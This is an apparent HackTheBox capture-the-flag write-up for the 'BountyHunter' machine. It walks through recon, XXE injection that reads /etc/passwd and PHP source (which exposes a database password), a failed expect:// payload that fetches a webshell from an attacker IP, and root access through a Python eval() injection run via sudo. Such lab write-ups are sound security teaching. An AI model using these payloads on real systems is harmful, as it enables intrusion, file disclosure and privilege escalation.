# BountyHunter - Easy

```sh
sudo vim /etc/hosts
# map IP to bountyhunter.htb

nmap -T4 -p- -A -Pn -v bountyhunter.htb
```

* open ports & services:

    * 22/tcp - ssh - OpenSSH 8.2p1 Ubuntu 4ubuntu0.2
    * 80/tcp - http - Apache httpd 2.4.41

* webpage on port 80 is for Bounty Hunters, and provides an option to download their pricing guide and a contact form

* however, as checked from Burp Suite, both these options lead to '/?' without any actual data, so we can ignore this for now

* the webpage also provides a link to their portal at /portal.php

* the portal page mentions that it's under development, and provides a link to test the bounty tracker - at /log_submit.php

* this includes an input form for a Beta bounty report system - we can test these input fields

* web scan:

    ```sh
    gobuster dir -u http://bountyhunter.htb -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt -t 10
    # directory scan

    ffuf -c -u "http://bountyhunter.htb" -H "Host: FUZZ.bountyhunter.htb" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -t 25 -fs 25169 -s
    # subdomain scan
    ```

* ```gobuster``` gives us multiple directories, but we can access only /resources

* in /resources, we have 'README.txt', which includes a few clues:

    * there's a 'test' account on portal, and it is using nopass instead of hashed passwords
    * there is a tracker submit script used
    * the tracker submit script is not connected to the DB
    * developer group permissions have been fixed

* we can submit a test request in /log_submit.php, and intercept it in Burp Suite for further testing

* the input fields in /log_submit.php are Title, CWE, Score & Reward; after submitting, the page shows the output as these values and also mentions that it has not been added to the DB (as it is not ready)

* the page uses a POST call to the endpoint '/tracker_diRbPr00f314.php' with the parameter 'data' having a blob of encoded data

* checking in CyberChef, the encoded data is XML data, first base64-encoded and then URL-encoded (encode all special chars), and it includes the values submitted:

    ```xml
    <?xml  version="1.0" encoding="ISO-8859-1"?>
            <bugreport>
            <title>test title</title>
            <cwe>CWE-102</cwe>
            <cvss>6.7</cvss>
            <reward>4000</reward>
            </bugreport>
    ```

* checking the source code for /log_submit.php, it uses a script at /resources/bountylog.js for the log of the submission:

    ```js
    function returnSecret(data) {
        return Promise.resolve($.ajax({
                type: "POST",
                data: {"data":data},
                url: "tracker_diRbPr00f314.php"
                }));
    }

    async function bountySubmit() {
        try {
            var xml = `<?xml  version="1.0" encoding="ISO-8859-1"?>
            <bugreport>
            <title>${$('#exploitTitle').val()}</title>
            <cwe>${$('#cwe').val()}</cwe>
            <cvss>${$('#cvss').val()}</cvss>
            <reward>${$('#reward').val()}</reward>
            </bugreport>`
            let data = await returnSecret(btoa(xml));
            $("#return").html(data)
        }
        catch(error) {
            console.log('Error:', error);
        }
    }
    ```

    * the 'bountySubmit' function uses the input values in the XML document and sends it to 'returnSecret' function in base64-encoded format

    * the 'returnSecret' function sends a POST call to the tracker script at '/tracker_diRbPr00f314.php' with the XML data

    * once the data is processed by '/tracker_diRbPr00f314.php', it is inserted in the webpage as it is

* checking the script at '/tracker_diRbPr00f314.php', it does not show us the PHP code so we cannot determine the logic implemented

* however, as we have XML data in the requests, we can attempt for injection attacks like XXE (XML external entities) and XSS

* testing for [XXE](https://github.com/SrivathsanNayak/ethical-hacking-notes/blob/main/HTBAcademy/WebAttacks/README.md#xxe-injection), we can use the following payload to test for local file disclosure:

    ```xml
    <?xml  version="1.0" encoding="ISO-8859-1"?>
    <!DOCTYPE title [
    <!ENTITY xxe SYSTEM "file:///etc/passwd">
    ]>
            <bugreport>
            <title>&xxe;</title>
            <cwe>test</cwe>
            <cvss>test</cvss>
            <reward>test</reward>
            </bugreport>
    ```

* we need to base64 encode this, and then URL encode this, before we can use it as a payload

* if we intercept a valid request on /log_submit.php (which does a POST call to /tracker_diRbPr00f314.php), and replace the value of 'data' with our final payload blob, we can see ```/etc/passwd``` in the response

* ```/etc/passwd``` shows that we have a user 'development' on the box

* also further testing shows that all 4 attributes - title, CWE, CVSS and reward - are vulnerable to XXE injection

* we can check if reading files like ```/home/development/.ssh/id_rsa``` or ```/home/development/.ssh/authorized_keys``` is possible, but this does not give anything

* to read other files which are not in XML format, such as PHP web files, we can use the wrapper filters:

    ```xml
    <?xml  version="1.0" encoding="ISO-8859-1"?>
    <!DOCTYPE title [
    <!ENTITY test SYSTEM "php://filter/convert.base64-encode/resource=index.php">
    ]>
            <bugreport>
            <title>&test;</title>
            <cwe>test</cwe>
            <cvss>test</cvss>
            <reward>test</reward>
            </bugreport>
    ```

* if we base64-encode & URL-encode this payload, and use it in the 'data' parameter's value, we are able to get the base64-encoded content of /index.php

* we can use this technique to read other PHP files - /portal.php, /log_submit.php and /tracker_diRbPr00f314.php

* checking the PHP code for the tracker script:

    ```php
    <?php

    if(isset($_POST['data'])) {
    $xml = base64_decode($_POST['data']);
    libxml_disable_entity_loader(false);
    $dom = new DOMDocument();
    $dom->loadXML($xml, LIBXML_NOENT | LIBXML_DTDLOAD);
    $bugreport = simplexml_import_dom($dom);
    }
    ?>
    If DB were ready, would have added:
    <table>
    <tr>
        <td>Title:</td>
        <td><?php echo $bugreport->title; ?></td>
    </tr>
    <tr>
        <td>CWE:</td>
        <td><?php echo $bugreport->cwe; ?></td>
    </tr>
    <tr>
        <td>Score:</td>
        <td><?php echo $bugreport->cvss; ?></td>
    </tr>
    <tr>
        <td>Reward:</td>
        <td><?php echo $bugreport->reward; ?></td>
    </tr>
    </table>
    ```

* the PHP code explicitly allows XXE loading, and loads the XML content with 'LIBXML_NOENT' (expands entities) & 'LIBXML_DTDLOAD' (loads DTDs)

* we can attempt to get RCE by fetching a webshell from attacker and writing to webapp - this requires PHP ```expect``` module to be enabled - but this payload does not work:

    ```xml
    <!DOCTYPE title [
    <!ENTITY test SYSTEM "expect://curl$IFS-O$IFS'10.10.14.34/simple-webshell.php'"">
    ]>
    ```

* as RCE from XXE is not working at the moment, we can run a directory scan to identify for any other files in webroot that we can read:

    ```sh
    gobuster dir -u http://bountyhunter.htb -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x txt,php,html,bak,jpg,zip,bac,sh,png,md,jpeg,pl,ps1,aspx -t 25
    ```

* this gives us a file 'db.php' in the web directory - we can attempt to read this using a similar XXE payload:

    ```xml
    <?xml  version="1.0" encoding="ISO-8859-1"?>
    <!DOCTYPE title [
    <!ENTITY test SYSTEM "php://filter/convert.base64-encode/resource=db.php">
    ]>
            <bugreport>
            <title>&test;</title>
            <cwe>test</cwe>
            <cvss>test</cvss>
            <reward>test</reward>
            </bugreport>
    ```

* this gives us the base64-encoded 'db.php' - when decoded we get the cleartext creds 'admin:m19RoAU0hP41A1sTsq6K'

* using this password, we can attempt to login as the user previously found from ```/etc/passwd```:

    ```sh
    ssh development@bountyhunter.htb
    # this works

    cat user.txt
    # user flag

    cat contract.txt
    # gives hints

    sudo -l
    # we can run a Python program as root
    ```

* the note in 'contract.txt' mentions to check for an internal tool by Skytrain Inc, and that we have the required permissions to test it

* ```sudo -l``` shows that we can run ```/usr/bin/python3.8 /opt/skytrain_inc/ticketValidator.py``` as root - we can check this further:

    ```sh
    ls -la /opt/skytrain_inc/

    cat /opt/skytrain_inc/ticketValidator.py

    ls -la /opt/skytrain_inc/invalid_tickets/

    cat /opt/skytrain_inc/invalid_tickets/*
    ```

    ```py
    #Skytrain Inc Ticket Validation System 0.1
    #Do not distribute this file.

    def load_file(loc):
        if loc.endswith(".md"):
            return open(loc, 'r')
        else:
            print("Wrong file type.")
            exit()

    def evaluate(ticketFile):
        #Evaluates a ticket to check for ireggularities.
        code_line = None
        for i,x in enumerate(ticketFile.readlines()):
            if i == 0:
                if not x.startswith("# Skytrain Inc"):
                    return False
                continue
            if i == 1:
                if not x.startswith("## Ticket to "):
                    return False
                print(f"Destination: {' '.join(x.strip().split(' ')[3:])}")
                continue

            if x.startswith("__Ticket Code:__"):
                code_line = i+1
                continue

            if code_line and i == code_line:
                if not x.startswith("**"):
                    return False
                ticketCode = x.replace("**", "").split("+")[0]
                if int(ticketCode) % 7 == 4:
                    validationNumber = eval(x.replace("**", ""))
                    if validationNumber > 100:
                        return True
                    else:
                        return False
        return False

    def main():
        fileName = input("Please enter the path to the ticket file.\n")
        ticket = load_file(fileName)
        #DEBUG print(ticket)
        result = evaluate(ticket)
        if (result):
            print("Valid ticket.")
        else:
            print("Invalid ticket.")
        ticket.close

    main()
    ```

* the ticket validator Python script takes an input for a filename, checks if it ends with '.md' (markdown format) for it to be a valid ticket, and evaluates it for a few conditions:

    * the 1st line should start with '# Skytrain Inc'
    * the 2nd line should start with '## Ticket to', following which it checks for destination details
    * it checks for the line with '\_\_Ticket Code:\_\_', this means the actual code is on the next line
    * on the next line, it checks for starting part '**' and extracts the actual ticket code
    * for checking validity, it checks if ```ticketCode % 7 == 4```
    * finally it uses ```eval()``` to evaluate a validation number using the expression inside the ticket

* the issue with the script is that it is using ```eval()``` function, which can be abused to get code injection

* checking the invalid tickets directory, we cannot write to this directory; but that is alright as the Python script does not check for the directory, it only checks for file extension

* we can create a malicious 'ticket' file to exploit the ```eval``` function - for the script to run we need to fulfill all conditions until the ```eval``` function is executed

* we can test it in our local system as well, before crafting the ticket in target; it is okay if it is an invalid ticket but we just need for it to reach ```eval```:

    ```sh
    vim test.md
    ```

    ```md
    # Skytrain Inc
    ## Ticket to test
    __Ticket Code:__
    **4+__import__("os").system("cat /root/root.txt")
    ```

* we can run the script now:

    ```sh
    sudo /usr/bin/python3.8 /opt/skytrain_inc/ticketValidator.py
    # give the input file path as 'test.md'

    # this works and we get root flag
    ```
